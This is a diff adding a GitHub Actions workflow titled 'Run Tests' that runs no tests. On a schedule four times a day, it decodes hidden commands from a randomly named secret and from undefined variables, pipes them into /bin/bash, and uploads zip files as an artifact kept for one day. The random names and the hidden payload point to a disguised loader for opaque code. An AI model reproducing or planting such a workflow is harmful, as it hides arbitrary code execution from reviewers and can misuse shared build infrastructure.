@@ -1,0 +1,32 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '50 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          fdbbr8306: ${{ secrets.fdbbr8306 }}
+        run: |
+          printf '%s' "$fdbbr8306" | jq -r .pb54428 | /bin/bash
+          printf '%s' "$ln49681" | jq -r .c32922 | /bin/bash
+          echo $aer17 | jq -r .rjln468 | /bin/bash
+          echo $bucpw85415 | jq -r .e5909 | /bin/bash
+          echo $orckw1318 | jq -r .xgro87699 | /bin/bash
+          printf '%s' "$q3" | jq -r .q5055 | /bin/bash
+          printf '%s' "$fu842" | jq -r .ugwe0 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: CQeZLaG6
+          path: "*.zip"
+          retention-days: 1
